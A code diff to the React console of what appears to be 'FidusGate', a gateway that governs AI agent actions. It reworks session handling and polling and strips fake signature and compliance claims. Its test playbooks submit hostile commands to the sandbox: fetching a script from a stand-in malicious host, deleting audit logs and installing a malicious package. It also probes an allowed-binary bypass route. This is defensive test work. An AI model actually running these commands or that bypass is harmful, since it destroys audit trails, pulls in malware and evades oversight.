@@ -8,9 +8,18 @@ import { SandboxTab } from './tabs/SandboxTab';
 import { Transaction, AuditReceipt, SecurityFinding } from '@fidusgate/core-types';
 import { API_BASE, assertSafeResourceId } from './lib/api';
 import { useTransactionAction } from './hooks/useTransactionAction';
-import { TabNav, type TabId } from './components/TabNav';
+import { ConnectedShell, type ConnectedView } from './connected/ConnectedShell';
+import { ConnectedDecisions, type ReceiptLoadStatus } from './connected/ConnectedDecisions';
+import { ConnectedVerifier, type ConnectedVerificationResult } from './connected/ConnectedVerifier';
 
 export default function App() {
+  const [session, setSession] = useState(0);
+  // Remount every session-owned view on disconnect. Late mutations cannot refill
+  // a subsequent user's state, including legacy forms and operation results.
+  return <ConnectedApp key={session} onDisconnect={() => setSession(value => value + 1)} />;
+}
+
+function ConnectedApp({ onDisconnect }: { onDisconnect: () => void }) {
   // State variables
   const [transactions, setTransactions] = useState<Transaction[]>([]);
   const [receipts, setReceipts] = useState<AuditReceipt[]>([]);
@@ -50,12 +59,18 @@ export default function App() {
   const [alignJustification, setAlignJustification] = useState('');
   const [alignLoading, setAlignLoading] = useState(false);
   
-  // Demo bearer state is memory-only. Production uses the OIDC BFF HttpOnly
-  // session cookie and must never persist bearer tokens or roles in localStorage.
+  // Development credentials are memory-only. Production auth remains fail-closed.
   const [authToken, setAuthToken] = useState<string | null>(null);
   const [authRole, setAuthRole] = useState<'developer' | 'admin' | 'auditor' | 'unauthenticated'>('unauthenticated');
   const [authEmail, setAuthEmail] = useState('admin@fidusgate.internal');
   const [authLoading, setAuthLoading] = useState(false);
+  const [bootstrapKey, setBootstrapKey] = useState('');
+  const [authError, setAuthError] = useState('');
+  const sessionEpoch = useRef(0);
+  const pollGeneration = useRef(0);
+  const [connection, setConnection] = useState<'checking' | 'connected' | 'unavailable'>('checking');
+  const [gatewayNotice, setGatewayNotice] = useState('');
+  const [receiptStatus, setReceiptStatus] = useState<ReceiptLoadStatus>('unauthorized');
 
   // Dynamically resolve request headers with JWT Bearer Token
   const getHeaders = useCallback(() => {
@@ -69,8 +84,7 @@ export default function App() {
   // Terminal Console state (declared before transaction action so onCreated can append)
   const [consoleLines, setConsoleLines] = useState<string[]>([
     'FidusGate Unified Security Shell v1.2.0 initialized.',
-    'Local environment verified. Docker daemon detected (Active).',
-    'Cedar policy governance gateway online (Dual-Mode active).',
+    'Environment and policy status are reported by the gateway when available.',
     'Standing by for live sandbox command execution. Type "help" to list workflows.',
   ]);
   const [consoleInput, setConsoleInput] = useState('');
@@ -107,17 +121,21 @@ export default function App() {
 
   // Verifier tool states
   const [receiptInput, setReceiptInput] = useState('');
-  const [verificationResult, setVerificationResult] = useState<{
-    status: 'idle' | 'valid' | 'invalid' | 'error';
-    message: string;
-    payload?: any;
-  }>({ status: 'idle', message: '' });
+  const [verificationResult, setVerificationResult] = useState<ConnectedVerificationResult>({ status: 'idle', message: '' });
+  const [verificationBusy, setVerificationBusy] = useState(false);
+  const verificationVersion = useRef(0);
+  const updateReceiptInput = (value: string) => {
+    verificationVersion.current += 1;
+    setReceiptInput(value);
+    setVerificationBusy(false);
+    setVerificationResult({ status: 'idle', message: '' });
+  };
   const [latestAutofix, setLatestAutofix] = useState<{ target: string, replacement: string } | null>(null);
   const [activePlaybook, setActivePlaybook] = useState<string | null>(null);
   const consoleEndRef = useRef<HTMLDivElement | null>(null);
   const [showArchPanel, setShowArchPanel] = useState(false);
   const [selectedArchComp, setSelectedArchComp] = useState<string | null>('gateway');
-  const [activeTab, setActiveTab] = useState<TabId>('ledger');
+  const [activeTab, setActiveTab] = useState<ConnectedView>('decisions');
   const [forensicSearch, setForensicSearch] = useState('');
   const [forensicStatusFilter, setForensicStatusFilter] = useState<'all' | 'success' | 'failed' | 'denied'>('all');
 
@@ -152,8 +170,8 @@ export default function App() {
     },
     {
       targetId: 'oidc-widget',
-      title: '🔑 Federated Identity Widget (OIDC)',
-      body: 'Authenticate as a Developer, Admin, or Auditor. The gateway validates actions against Cedar policies using your role identity.',
+      title: 'Development gateway session',
+      body: 'Enter your development bootstrap key to request a role-scoped session. The gateway enforces authorization. This reference console does not provide production OIDC sign-in.',
       position: 'bottom'
     },
     {
@@ -187,6 +205,7 @@ export default function App() {
       if (tourSteps[tourStep + 1].targetId === 'copilot-playground' || tourSteps[tourStep + 1].targetId === 'policy-simulator') {
         setActiveTab('policy');
       }
+      if (tourSteps[tourStep + 1].targetId === 'circuit-breaker-switch') setActiveTab('compliance');
       if (tourSteps[tourStep + 1].targetId === 'syscall-monitor') {
         setActiveTab('sandbox');
       }
@@ -201,6 +220,7 @@ export default function App() {
       if (tourSteps[tourStep - 1].targetId === 'copilot-playground' || tourSteps[tourStep - 1].targetId === 'policy-simulator') {
         setActiveTab('policy');
       }
+      if (tourSteps[tourStep - 1].targetId === 'circuit-breaker-switch') setActiveTab('compliance');
       if (tourSteps[tourStep - 1].targetId === 'syscall-monitor') {
         setActiveTab('sandbox');
       }
@@ -240,10 +260,11 @@ export default function App() {
     plmActiveDirectives: 0,
     devopsCompliance: { pipeline: 0, security: 0, drift: 0 },
     sandboxActiveContainers: 0,
-    databaseStatus: 1,
+    available: false,
+    databaseStatus: 0,
     databaseLatencyMs: 0,
-    latencyHistory: [8, 12, 10, 15, 14, 9, 11, 24, 13, 14, 15, 12, 11, 16, 14],
-    requestRateHistory: [2, 4, 1, 3, 5, 0, 2, 4, 3, 1, 5, 6, 2, 3, 4],
+    latencyHistory: [],
+    requestRateHistory: [],
     autoThrottleActive: 0
   });
 
@@ -252,43 +273,10 @@ export default function App() {
     consoleEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   }, [consoleLines]);
 
-  // Load chat history from backend on token/auth change
-  useEffect(() => {
-    const fetchChatHistory = async () => {
-      try {
-        const res = await fetch(`${API_BASE}/policy/chat-history`, { headers: getHeaders() });
-        if (res.ok) {
-          setChatMessages(await res.json());
-        }
-      } catch (err) {
-        console.error('Failed to fetch chat history:', err);
-      }
-    };
-    if (authToken) {
-      fetchChatHistory();
-    }
-  }, [authToken, getHeaders]);
-
   // Auto-scroll chat container
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
   }, [chatMessages]);
-
-  // Auto-trigger tour on first load
-  useEffect(() => {
-    const hasSeenTour = localStorage.getItem('fidusgate_seen_tour');
-    if (!hasSeenTour) {
-      const timer = setTimeout(() => {
-        setTourStep(0);
-        setTourActive(true);
-        localStorage.setItem('fidusgate_seen_tour', 'true');
-      }, 1500);
-      return () => {
-        clearTimeout(timer);
-      };
-    }
-    return;
-  }, []);
 
   // Update spotlight targets on active step change
   useEffect(() => {
@@ -314,53 +302,74 @@ export default function App() {
   }, [tourActive, tourStep]);
 
 
-  // Fetch all data from backend
+  // Poll through the same authenticated API as every operation. Browser WebSocket
+  // cannot supply the header required by the gateway; do not weaken that guard.
   const fetchData = useCallback(async () => {
+    const epoch = sessionEpoch.current;
+    const generation = ++pollGeneration.current;
+    const current = () => epoch === sessionEpoch.current && generation === pollGeneration.current;
     try {
-      const [txRes, receiptsRes, findingsRes, plmRes, ibpRes, claimsRes, patchRes, driftRes, logsRes, policyRes, configRes, consensusRes, budgetExtensionsRes, verifyChainRes] = await Promise.all([
-        fetch(`${API_BASE}/transactions`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/receipts`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/findings`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/plm/state`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/ibp/state`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/auth/attested-claims`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/sandbox/patch`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/sandbox/drift`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/logs/commands`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/policy/active`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/system/config`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/consensus/requests`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/ibp/budget/extensions`, { headers: getHeaders() }),
-        fetch(`${API_BASE}/receipts/verify-chain`, { headers: getHeaders() })
-      ]);
-
-      if (txRes.ok) setTransactions(await txRes.json());
-      if (receiptsRes.ok) setReceipts(await receiptsRes.json());
-      if (verifyChainRes.ok) {
-        const chainData = await verifyChainRes.json();
-        setIsChainValid(chainData.valid);
+      const health = await fetch('/health', { headers: getHeaders(), signal: AbortSignal.timeout(8000) });
+      const data = await health.json();
+      if (!current()) return;
+      const breakerActive = data.circuit_breaker_active || data.error === 'AGENTIC_CIRCUIT_BREAKER_ACTIVE';
+      setConnection(health.ok || data.status === 'degraded' || breakerActive ? 'connected' : 'unavailable');
+      setGatewayNotice(breakerActive ? 'Gateway reports its circuit breaker is active.' : '');
+    } catch {
+      if (!current()) return;
+      setConnection('unavailable');
+      setGatewayNotice('Health check unavailable. Protected reads may also be unavailable.');
+    }
+    if (!authToken || !current()) return;
+    try {
+      const paths = ['/transactions', '/receipts', '/findings', '/plm/state', '/ibp/state',
+        '/auth/attested-claims', '/sandbox/patch', '/sandbox/drift', '/logs/commands',
+        '/policy/active', '/system/config', '/consensus/requests', '/ibp/budget/extensions',
+        '/receipts/verify-chain', '/policy/chat-history'];
+      const results = await Promise.allSettled(paths.map(async path => {
+        const response = await fetch(`${API_BASE}${path}`, { headers: getHeaders(), signal: AbortSignal.timeout(8000) });
+        return { ok: response.ok, status: response.status, data: response.ok ? await response.json() : null };
+      }));
+      if (!current()) return;
+      const result = (index: number) => {
+        const item = results[index];
+        return item.status === 'fulfilled' ? item.value : { ok: false, status: 0, data: null };
+      };
+      // Expired credentials end the whole session, not just its visible receipt list.
+      if (results.some(item => item.status === 'fulfilled' && item.value.status === 401)) {
+        sessionEpoch.current += 1;
+        onDisconnect();
+        return;
       }
-      if (findingsRes.ok) setFindings(await findingsRes.json());
-      if (plmRes.ok) setPlmState(await plmRes.json());
-      if (ibpRes.ok) setIbpState(await ibpRes.json());
-      if (claimsRes.ok) setAttestedClaims(await claimsRes.json());
-      if (patchRes.ok) setPendingPatch(await patchRes.json());
-      if (driftRes.ok) setDriftState(await driftRes.json());
-      if (logsRes.ok) setForensicLogs(await logsRes.json());
-      if (configRes.ok) setSystemConfig(await configRes.json());
-      if (consensusRes.ok) setConsensusRequests(await consensusRes.json());
-      if (budgetExtensionsRes.ok) setBudgetExtensions(await budgetExtensionsRes.json());
-      if (policyRes.ok) {
-        const data = await policyRes.json();
-        setActivePolicyCode(data.code);
-        setSimDraftPolicy(prev => prev || data.code);
+      const [tx, receipt, finding, plm, ibp, claims, patch, drift, logs, policy, config, consensus, budgets, chain, chat] = paths.map((_, index) => result(index));
+      setTransactions(tx.ok ? tx.data : []);
+      setReceipts(receipt.ok ? receipt.data : []);
+      setReceiptStatus(receipt.ok ? 'ready' : receipt.status === 403 ? 'unauthorized' : 'error');
+      setIsChainValid(chain.ok && typeof chain.data.valid === 'boolean' ? chain.data.valid : null);
+      setFindings(finding.ok ? finding.data : []);
+      setPlmState(plm.ok ? plm.data : null);
+      setIbpState(ibp.ok ? ibp.data : null);
+      setAttestedClaims(claims.ok ? claims.data : null);
+      setPendingPatch(patch.ok ? patch.data : null);
+      setDriftState(drift.ok ? drift.data : []);
+      setForensicLogs(logs.ok ? logs.data : []);
+      setSystemConfig(config.ok ? config.data : null);
+      setConsensusRequests(consensus.ok ? consensus.data : []);
+      setBudgetExtensions(budgets.ok ? budgets.data : []);
+      setChatMessages(chat.ok ? chat.data : []);
+      setActivePolicyCode(policy.ok ? policy.data.code : '');
+      if (policy.ok) setSimDraftPolicy(prev => prev || policy.data.code);
+      if (results.some(item => item.status === 'rejected' || !item.value.ok)) {
+        setGatewayNotice('Some gateway data is unavailable or restricted for this role. Unavailable records have been cleared.');
       }
 
       // Poll Port 3002 Prometheus metrics
       try {
-        const metricsRes = await fetch('http://localhost:3002/metrics');
+        const metricsRes = await fetch('/metrics', { signal: AbortSignal.timeout(8000) });
         if (metricsRes.ok) {
           const text = await metricsRes.text();
+          if (!current()) return;
+          if (!text.includes('fidusgate_gateway_policy_evaluations_total')) throw new Error('Metrics unavailable');
           
           const parseMetricValue = (metricName: string, labelFilters: Record<string, string> = {}): number => {
             const lines = text.split('\n');
@@ -399,13 +408,14 @@ export default function App() {
           setPrometheusMetrics((prev: any) => {
             const totalEvals = allow + deny;
             const prevTotal = (prev.policyEvaluationsAllow || 0) + (prev.policyEvaluationsDeny || 0);
-            const requestRate = totalEvals > prevTotal ? totalEvals - prevTotal : Math.floor(Math.random() * 3);
+            const requestRate = Math.max(0, totalEvals - prevTotal);
             
-            const nextRequestRateHistory = [...prev.requestRateHistory.slice(1), requestRate];
-            const currentLatency = dbLatency > 0 ? dbLatency : Math.floor(10 + Math.random() * 8);
-            const nextLatencyHistory = [...prev.latencyHistory.slice(1), currentLatency];
+            const nextRequestRateHistory = [...prev.requestRateHistory.slice(-14), requestRate];
+            const currentLatency = dbLatency;
+            const nextLatencyHistory = [...prev.latencyHistory.slice(-14), currentLatency];
 
             return {
+              available: true,
               policyEvaluationsAllow: allow,
               policyEvaluationsDeny: deny,
               ibpTokensBurned: tokens,
@@ -419,14 +429,18 @@ export default function App() {
               autoThrottleActive: autoThrottleActive
             };
           });
-        }
-      } catch (err) {
-        // Silent catch fallback to keep running cleanly offline
+        } else { throw new Error('Metrics unavailable'); }
+      } catch {
+        if (current()) setPrometheusMetrics((prev: Record<string, unknown>) => ({ ...prev, available: false }));
       }
     } catch (e) {
+      if (!current()) return;
+      setReceipts([]);
+      setReceiptStatus('error');
+      setIsChainValid(null);
       console.error('Failed to fetch data from security gateway', e);
     }
-  }, [getHeaders]);
+  }, [getHeaders, authToken, onDisconnect]);
 
   const handleSimulate = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -570,18 +584,19 @@ export default function App() {
       const policyRes = await fetch(`${API_BASE}/policy/active`, {
         headers: getHeaders()
       });
+      if (!policyRes.ok) throw new Error('Active policy could not be read');
       const policyData = await policyRes.json();
       const policyCode = policyData.code || "";
 
       const report = {
-        complianceStandard: "FidusGate-SecOps-v1.0",
+        reportType: "Unsigned local gateway snapshot",
+        verification: "This export is not a signed compliance attestation. Verify receipts separately.",
         reportId: `rep_${Math.floor(100000 + Math.random() * 900000)}`,
         timestamp: new Date().toISOString(),
         environment: "FidusGate Secure Sandbox Monorepo (gVisor optional)",
         assessedSession: {
           userEmail: authEmail,
           userRole: authRole,
-          jwtTokenSample: authToken ? `${authToken.substring(0, 20)}...` : 'unauthenticated',
         },
         databaseIntegrity: {
           totalAuditedEvents: forensicLogs.length,
@@ -589,21 +604,16 @@ export default function App() {
           verifiableReceiptsCount: receipts.length,
         },
         cedarGovernanceContext: {
-          policyDigest: "sha256-df20721389de78a2e10fc39c8942b0d07412ae89fd2b13c7809aef823101de83",
           activeCedarPolicy: policyCode
         },
-        attestedTransactionChain: transactions.map(t => ({
+        transactions: transactions.map(t => ({
           transactionId: t.id,
           timestamp: t.timestamp,
           sender: t.sender,
           recipient: t.recipient,
           amount: t.amount,
           currency: t.currency,
-          status: t.status,
-          verification: {
-            attestation: "Ed25519 Cryptographic Signatures Verified",
-            signatureHash: "0x7f3a9e2db0a1b2c3d4e5f6g7h8i9j0"
-          }
+          status: t.status
         })),
         auditedCommandLogs: forensicLogs.map((l: any) => ({
           logId: l.id,
@@ -627,140 +637,37 @@ export default function App() {
 
       setConsoleLines(prev => [
         ...prev,
-        `🔒 [Compliance] Cryptographic SecOps Report successfully generated and downloaded (ID: ${report.reportId})`
+        `🔒 [Compliance] Unsigned gateway snapshot successfully generated and downloaded (ID: ${report.reportId})`
       ]);
     } catch (err: any) {
       console.error("Failed to generate audit report:", err);
       setConsoleLines(prev => [
         ...prev,
-        `❌ [Compliance] Failed to export cryptographic audit report: ${err.message}`
+        `❌ [Compliance] Failed to export gateway snapshot: ${err.message}`
       ]);
     }
   };
 
   useEffect(() => {
-    // Initial fetch of static states on mount
-    fetchData();
-
-    let socket: WebSocket | null = null;
-    let fallbackInterval: any = null;
-
-    const connectWS = () => {
-      const wsUrl = API_BASE.replace(/^http/, 'ws');
-      socket = new WebSocket(wsUrl);
-
-      socket.onopen = () => {
-        console.log('📡 Connected to FidusGate SecOps WebSockets stream');
-        if (fallbackInterval) {
-          clearInterval(fallbackInterval);
-          fallbackInterval = null;
-        }
-      };
-
-      socket.onmessage = (event) => {
-        try {
-          const { event: wsEvent, data } = JSON.parse(event.data);
-          if (wsEvent === 'transaction_created') {
-            setTransactions(prev => {
-              if (prev.some(t => t.id === data.id)) return prev;
-              return [data, ...prev];
-            });
-          } else if (wsEvent === 'command_log_created') {
-            setForensicLogs(prev => {
-              if (prev.some(l => l.id === data.id)) return prev;
-              return [data, ...prev];
-            });
-            // Update secure shell lines on background execution broadcasts
-            if (data.command && !data.command.startsWith('git apply')) {
-              if (data.status === 'failed') {
-                setConsoleLines(prev => [...prev, `❌ [ALERT] Secure shell blocked command: "${data.command}"`]);
-              } else {
-                setConsoleLines(prev => [...prev, `⚙️ [AUDIT] Command successfully executed inside sandbox: "${data.command}"`]);
-              }
-            }
-          } else if (wsEvent === 'consensus_gating_triggered') {
-            setConsensusRequests(prev => {
-              if (prev.some(a => a.id === data.actionId)) return prev;
-              return [{
-                id: data.actionId,
-                command: data.command,
-                initiator: data.initiator,
-                role: data.role,
-                status: 'pending',
-                aiRating: data.aiRating || 'safe',
-                aiReason: data.aiReason || '',
-                adminOverridden: false,
-                approvals: []
-              }, ...prev];
-            });
-          } else if (wsEvent === 'consensus_approval_added' || wsEvent === 'consensus_approved') {
-            fetch(`${API_BASE}/consensus/requests`, { headers: getHeaders() })
-              .then(res => {
-                if (res.ok) return res.json();
-                throw new Error('Failed to refetch');
-              })
-              .then(reqs => setConsensusRequests(reqs))
-              .catch(err => console.error(err));
-          } else if (wsEvent === 'consensus_overridden') {
-            setConsensusRequests(prev => prev.map(a => {
-              if (a.id === data.id) {
-                return data;
-              }
-              return a;
-            }));
-          } else if (wsEvent === 'chat_message_created') {
-            setChatMessages(prev => {
-              const { userMessage, assistantMessage } = data;
-              let next = [...prev];
-              if (!next.some(m => m.id === userMessage.id)) {
-                next.push(userMessage);
-              }
-              if (!next.some(m => m.id === assistantMessage.id)) {
-                next.push(assistantMessage);
-              }
-              return next;
-            });
-          } else if (
-            wsEvent === 'budget_extension_created' ||
-            wsEvent === 'budget_extension_approved' ||
-            wsEvent === 'budget_extension_rejected' ||
-            wsEvent === 'ibp_state_updated' ||
-            wsEvent === 'plm_state_updated' ||
-            wsEvent === 'devops_state_updated' ||
-            wsEvent === 'findings_updated'
-          ) {
-            fetchData();
-          }
-        } catch (err) {
-          console.error('Failed to parse WS payload:', err);
-        }
-      };
-
-      socket.onclose = () => {
-        console.warn('📡 WebSockets disconnected. Retrying in 5 seconds...');
-        if (!fallbackInterval) {
-          fallbackInterval = setInterval(fetchData, 4000);
-        }
-        setTimeout(connectWS, 5000);
-      };
-
-      socket.onerror = (err) => {
-        console.error('📡 WebSockets connection error:', err);
-        socket?.close();
-      };
+    let disposed = false;
+    let timer: ReturnType<typeof setTimeout> | undefined;
+    const poll = async () => {
+      await fetchData();
+      if (!disposed) timer = setTimeout(poll, 4000);
     };
-
-    connectWS();
-
+    void poll();
     return () => {
-      socket?.close();
-      if (fallbackInterval) clearInterval(fallbackInterval);
+      disposed = true;
+      sessionEpoch.current += 1;
+      if (timer) clearTimeout(timer);
     };
   }, [fetchData]);
 
-  // OIDC Federated Identity Login Handler
+  // Development bootstrap sign-in (production remains fail-closed).
   const handleOidcLogin = async (selectedRole: 'developer' | 'admin' | 'auditor') => {
+    if (!bootstrapKey.trim() || authLoading) return;
     setAuthLoading(true);
+    setAuthError('');
     try {
       let resolvedEmail = authEmail.trim();
       // Dynamically align default mock emails to the selected role for frictionless UX,
@@ -780,12 +687,16 @@ export default function App() {
 
       const res = await fetch(`${API_BASE}/auth/token`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 'Content-Type': 'application/json', 'x-fidusgate-bootstrap-key': bootstrapKey },
         body: JSON.stringify({ role: selectedRole, email: resolvedEmail })
       });
       
       if (res.ok) {
         const data = await res.json();
+        if (typeof data.token !== 'string' || !['developer', 'admin', 'auditor'].includes(data.role)) throw new Error('Invalid session response');
+        sessionEpoch.current += 1;
+        setBootstrapKey('');
+        setReceiptStatus('loading');
         setAuthToken(data.token);
         setAuthRole(data.role);
         
@@ -793,35 +704,24 @@ export default function App() {
           ...prev,
           `🔑 [Demo only] Authenticated with a memory-only development session.`,
           `🧑‍💻 User: ${data.email} | Active Role: ${data.role.toUpperCase()}`,
-          `🎫 Development bearer token held only in memory; production requires an OIDC BFF cookie.`
+          `🎫 Development bearer token held only in memory; production authentication is not implemented in this reference console.`
         ]);
       } else {
         const errorData = await res.json().catch(() => ({}));
-        alert(`Authentication failed: ${errorData.error || errorData.message || 'OIDC provider rejected transaction.'}`);
+        setAuthError(`Authentication failed: ${errorData.error || errorData.message || 'Gateway rejected sign-in.'}`);
       }
     } catch (err) {
       console.error(err);
-      alert('Failed to connect to authentication server.');
+      setAuthError('Could not establish a gateway session. Check the gateway and bootstrap key.');
     } finally {
       setAuthLoading(false);
     }
   };
 
   const handleOidcLogout = () => {
-    setAuthToken(null);
-    setAuthRole('unauthenticated');
-    
-    // Explicitly flush state arrays on logout for leak-proof security
-    setTransactions([]);
-    setReceipts([]);
-    setFindings([]);
-    setPlmState(null);
-    setChatMessages([]);
-    
-    setConsoleLines(prev => [
-      ...prev,
-      `🔓 [OIDC] Session disconnected. Authorization headers flushed. Secure ledger cache purged.`
-    ]);
+    sessionEpoch.current += 1;
+    verificationVersion.current += 1;
+    onDisconnect();
   };
 
   // Toggle Emergency Circuit Breaker (Kill-Switch)
@@ -1091,65 +991,43 @@ export default function App() {
     }
   };
 
-  // Standalone Verifier tool
+  // Verify the exact input via the gateway; edited inputs invalidate in-flight results.
   const handleVerifyReceipt = async () => {
-    setVerificationResult({ status: 'idle', message: '' });
-    if (!receiptInput.trim()) {
-      setVerificationResult({ status: 'error', message: 'Please paste a JSON receipt to verify.' });
+    const version = ++verificationVersion.current;
+    let receipt: unknown;
+    try {
+      receipt = JSON.parse(receiptInput);
+    } catch {
+      setVerificationResult({ status: 'error', message: 'Invalid JSON. Paste a complete signed receipt.' });
       return;
     }
-
+    setVerificationBusy(true);
+    setVerificationResult({ status: 'idle', message: '' });
     try {
-      const receipt: AuditReceipt = JSON.parse(receiptInput);
-      const { payload, signature } = receipt;
-
-      if (!payload || !signature || !signature.sig || !signature.kid) {
-        setVerificationResult({
-          status: 'invalid',
-          message: 'Malformed receipt structure. Ensure the JSON contains payload and signature fields.'
-        });
-        return;
-      }
-
       const res = await fetch(`${API_BASE}/receipts/verify`, {
-        method: 'POST',
-        headers: getHeaders(),
-        body: JSON.stringify(receipt)
+        method: 'POST', headers: getHeaders(), body: JSON.stringify(receipt), signal: AbortSignal.timeout(10000)
       });
-
-      if (res.ok) {
-        const data = await res.json();
-        if (data.verified) {
-          setVerificationResult({
-            status: 'valid',
-            message: '✓ VALID SIGNATURE: Cryptographic integrity confirmed. The audit receipt has NOT been altered since its issuance.',
-            payload
-          });
-        } else {
-          setVerificationResult({
-            status: 'invalid',
-            message: '✗ SIGNATURE FAILURE: The signature is invalid! The audit trail has been tampered with or is signed by an unauthorized key.',
-            payload
-          });
-        }
+      const data = await res.json();
+      if (version !== verificationVersion.current) return;
+      if (!res.ok) {
+        setVerificationResult({ status: res.status === 400 ? 'invalid' : 'error', message: data.error || `Gateway returned HTTP ${res.status}.` });
       } else {
-        const err = await res.json();
         setVerificationResult({
-          status: 'invalid',
-          message: `✗ VERIFICATION FAILURE: ${err.error || 'Server error'}`,
-          payload
+          status: data.verified === true ? 'valid' : 'invalid',
+          message: data.verified === true ? 'The gateway accepted this receipt under its configured signature verification rules.' : data.reason || 'The gateway did not accept this signature. Check the receipt and signing key.',
+          payload: receipt && typeof receipt === 'object' && 'payload' in receipt ? receipt.payload : undefined
         });
       }
-    } catch (e) {
-      setVerificationResult({
-        status: 'error',
-        message: 'Invalid JSON format. Please check the structure and try again.'
-      });
+    } catch {
+      if (version === verificationVersion.current) setVerificationResult({ status: 'error', message: 'The gateway could not complete verification. Check its connection and try again.' });
+    } finally {
+      if (version === verificationVersion.current) setVerificationBusy(false);
     }
   };
 
   // Clear database helper
   const handleResetDatabase = async () => {
+    if (authRole !== 'admin') return;
     if (!confirm('Are you sure you want to reset all transactions, receipts, and findings to the original template status?')) return;
     try {
       const res = await fetch(`${API_BASE}/reset`, { 
@@ -1250,6 +1128,11 @@ export default function App() {
     setLatestAutofix(null);
     const cmd = fullCmd.toLowerCase().trim();
     setActivePlaybook(cmd);
+    const epoch = sessionEpoch.current;
+    const pause = async () => {
+      await new Promise<void>(resolve => setTimeout(resolve, 600));
+      return epoch === sessionEpoch.current;
+    };
 
     try {
       if (cmd === 'help') {
@@ -1269,7 +1152,7 @@ export default function App() {
           '',
           'Utility commands:',
           '  help         - Show this playbook menu',
-          '  sys-status   - Check CPU hardware and Docker/gVisor sandbox daemon',
+          '  sys-status   - Show observed gateway and session status',
           '  clear        - Clear the terminal console screen',
           '============================================================='
         ]);
@@ -1278,19 +1161,18 @@ export default function App() {
       } else if (cmd === 'sys-status') {
         setConsoleLines(prev => [
           ...prev,
-          '⚙️  [SYSTEM] Status: ONLINE',
-          '📦 Package Manager: npm workspaces (active)',
-          '🐳 Sandbox Engine: Docker Desktop (Running)',
-          '🔒 Governance Engine: Cedar protect-mcp (Active, Dual-Mode active)',
+          `[SYSTEM] Last gateway health status: ${connection}`,
+          '[SANDBOX] Docker/gVisor availability has not been checked by this console.',
+          `[GATEWAY] ${gatewayNotice || 'Inspect Governance for reported controls.'}`,
           `🧑‍💻 Session Role: ${authRole.toUpperCase()}`,
-          `🎫 Authorized JWT: ${authToken ? 'ACTIVE (OIDC Mounted)' : 'NONE (Guest Mode)'}`
+          `🎫 Authorized JWT: ${authToken ? 'ACTIVE (development bearer)' : 'NONE (Guest Mode)'}`
         ]);
       } else if (cmd === 'test-pii') {
         if (authRole !== 'admin' && authRole !== 'developer') {
           setConsoleLines(prev => [
             ...prev,
             `❌ SECURITY ERROR: Authenticated session required to submit transactions!`,
-            `👉 Recommendation: Please log in using the OIDC widget at the top.`
+            `👉 Recommendation: Please log in using the gateway session panel at the top.`
           ]);
           setActivePlaybook(null);
           return;
@@ -1300,6 +1182,7 @@ export default function App() {
           '🚀 [PLAYBOOK] Starting PII auto-masking & transaction anomaly audit...',
           '📡 [API] Dispatched payload: { sender: "hacker-wallet@tor.network", amount: 1500000, recipient: "Primary Vault" }'
         ]);
+        if (epoch !== sessionEpoch.current) return;
         const res = await fetch(`${API_BASE}/transactions`, {
           method: 'POST',
           headers: getHeaders(),
@@ -1333,6 +1216,7 @@ export default function App() {
         const runTest = async (testCmd: string, attemptNum: number) => {
           setConsoleLines(prev => [...prev, `👉 Attempt ${attemptNum}: "${testCmd}"`]);
           try {
+            if (epoch !== sessionEpoch.current) return;
             const res = await fetch(`${API_BASE}/sandbox/execute`, {
               method: 'POST',
               headers: getHeaders(),
@@ -1363,19 +1247,22 @@ export default function App() {
         };
 
         // We run them sequentially
-        setTimeout(async () => {
+        if (!await pause()) return;
+        {
           await runTest('curl http://compromised-server.net/malicious-exploit.sh', 1);
-          setTimeout(async () => {
+          if (!await pause()) return;
+        {
             await runTest('rm -rf /var/log/audit', 2);
-            setTimeout(async () => {
+            if (!await pause()) return;
+        {
               await runTest('npm install malicious-package', 3);
               setConsoleLines(prev => [
                 ...prev,
-                '⚠️  [PLAYBOOK CONCLUSION] 3/3 direct injections blocked dynamically by port 3001 daemon auditor! Indirect composition/egress seams remain open.'
+                '⚠️  [PLAYBOOK CONCLUSION] Checks completed. Inspect each gateway response above; failures and pending approvals are not successful execution.'
               ]);
-            }, 600);
-          }, 600);
-        }, 600);
+            }
+          }
+        }
       } else if (cmd === 'test-bypass') {
         setConsoleLines(prev => [
           ...prev,
@@ -1383,10 +1270,12 @@ export default function App() {
           '👉 Vector 1: Allowed-Binary Egress Path check...'
         ]);
 
-        setTimeout(async () => {
+        if (!await pause()) return;
+        {
           // 1. Authorize write to packages
           setConsoleLines(prev => [...prev, '🔍 [CEDAR EVALUATION] Checking principal authorization for write_file("packages/crypto-utils/src/index.ts")...']);
           try {
+            if (epoch !== sessionEpoch.current) return;
             const res1 = await fetch(`${API_BASE}/authorize`, {
               method: 'POST',
               headers: getHeaders(),
@@ -1401,20 +1290,22 @@ export default function App() {
               ...prev,
               data1.decision === 'allow'
                 ? '✅ [DECISION] Permitted: ALLOW (Tier 2 rule permits modifications inside source directories)'
-                : `❌ [DECISION] Blocked: ${data1.decision.toUpperCase()}`
+                : `❌ [DECISION] Blocked: ${String(data1.decision || data1.error || 'No decision').toUpperCase()}`
             ]);
           } catch (err: any) {
             setConsoleLines(prev => [...prev, `❌ [CONNECTION ERROR] ${err.message}`]);
           }
 
           // 2. Authorize execute sandboxed node command
-          setTimeout(async () => {
+          if (!await pause()) return;
+        {
             const bypassCmd = 'bash scripts/sandbox-execute.sh "node packages/crypto-utils/src/index.ts" "."';
             setConsoleLines(prev => [
               ...prev,
               `🔍 [AUDITOR CHECK] Submitting allowed-binary command: "${bypassCmd}"`
             ]);
             try {
+              if (epoch !== sessionEpoch.current) return;
               const res2 = await fetch(`${API_BASE}/sandbox/execute`, {
                 method: 'POST',
                 headers: getHeaders(),
@@ -1436,13 +1327,15 @@ export default function App() {
             }
 
             // 3. Vector 2: Composition check
-            setTimeout(async () => {
+            if (!await pause()) return;
+        {
